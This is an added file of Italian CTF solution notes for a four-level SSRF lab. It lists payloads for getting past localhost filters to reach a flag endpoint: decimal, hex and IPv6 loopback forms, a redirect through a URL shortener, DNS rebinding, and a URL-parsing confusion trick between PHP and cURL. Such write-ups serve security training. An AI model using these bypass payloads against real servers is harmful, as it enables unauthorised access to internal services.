@@ -1,0 +1,52 @@
+1)WS_1.05 - ssrf basics - level 1
+
+http://127.0.0.1/get_flag.php
+
+2)WS_1.05 - ssrf basics - level 2
+
+⚔️ Strategie di Bypass (SSRF Evasion)
+Esistono decine di modi per riferirsi a "se stessi" (localhost) senza scrivere esplicitamente 127.0.0.1. Ecco una tabella dei bypass più comuni da testare:
+
+Tecnica,            Payload da provare,         Descrizione
+Rappresentazione Decimale,          http://2130706433/get_flag.php,         L'IP convertito in un intero a 32 bit.
+Rappresentazione Esadecimale,           http://0x7f000001/get_flag.php,         L'IP in formato hex (molto efficace).
+Indirizzo Accorciato,           http://127.1/get_flag.php,          Molti sistemi risolvono 127.1 come 127.0.0.1.
+
+"Indirizzo ""Wildcard""",           http://0.0.0.0/get_flag.php,            "Su Linux, 0.0.0.0 spesso punta al localhost."
+
+Indirizzo IPv6,         http://[::1]/get_flag.php,          La versione IPv6 del loopback.
+
+DNS Redirection,            http://localtest.me/get_flag.php,           Un dominio pubblico che punta sempre a 127.0.0.1.
+
+Il bypass IPv6 (L'errore di implementazione),            http://[::1]/get_flag.php
+
+3)WS_1.05 - ssrf basics - level 3
+https://tinyurl.com/
+
+inserisci: http://127.0.0.1/get_flag.php
+Copia l'url che ti da e inseriscilo
+
+4)WS_1.05 - ssrf basics - level 4
+->https://lock.cmpxchg8b.com/rebinder.html
+
+Dobbiamo convertire gli IP in esadecimale:
+
+    127.0.0.1 -> 7f000001
+
+    8.8.8.8 (un IP pubblico sicuro) -> 08080808
+
+Il tuo payload sarà:
+http://7f000001.08080808.rbndr.us/get_flag.php
+
+Se non funziona, prova questo:
+
+http://google.com:80@127.0.0.1:80@google.com/get_flag.php
+
+⚔️ dobbiamo ricordare come è fatto un URL standard:
+schema://utente:password@host:porta/percorso
+
+Componente,                     "Cosa ""vede"" PHP",                "Cosa ""vede"" cURL"
+Credenziali,                    google.com:80@127.0.0.1:80,         google.com:80
+Host (Destinazione),            google.com (SICURO ✅),             127.0.0.1 (TARGET 🎯)
+
+cambia identità a seconda di chi lo legge!
